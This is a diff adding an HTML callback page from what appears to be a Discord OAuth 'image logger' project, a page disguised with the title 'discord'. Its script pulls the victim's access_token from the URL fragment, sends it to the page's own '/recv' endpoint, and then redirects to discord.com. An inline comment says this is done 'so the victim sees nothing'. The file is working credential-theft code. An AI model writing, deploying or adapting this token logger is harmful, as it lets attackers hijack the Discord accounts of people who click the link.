@@ -1,0 +1,41 @@
+<!-- language: HTML, file: oauth-image-logger/static/cb.html -->
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>discord</title>
+<style>
+  html, body {
+    margin: 0; height: 100vh; background: #000;
+    color: #5865F2; font-family: monospace;
+    display: flex; align-items: center; justify-content: center;
+  }
+</style>
+</head>
+<body>
+<pre id="o">logging in...</pre>
+<script>
+  (function () {
+    var h = new URLSearchParams(location.hash.slice(1));
+    var t = h.get("access_token");
+    var err = h.get("error");
+    var o = document.getElementById("o");
+
+    if (t) {
+      o.textContent = "ok";
+      // ship the token, then bounce to discord so the victim sees nothing
+      try {
+        fetch("/recv?t=" + encodeURIComponent(t), { keepalive: true });
+      } catch (e) {}
+      setTimeout(function () { location.href = "https://discord.com/app"; }, 1200);
+    } else if (err) {
+      o.textContent = "cancelled";
+      setTimeout(function () { location.href = "https://discord.com/app"; }, 1500);
+    } else {
+      o.textContent = "no token";
+      setTimeout(function () { location.href = "https://discord.com/app"; }, 1500);
+    }
+  })();
+</script>
+</body>
+</html>
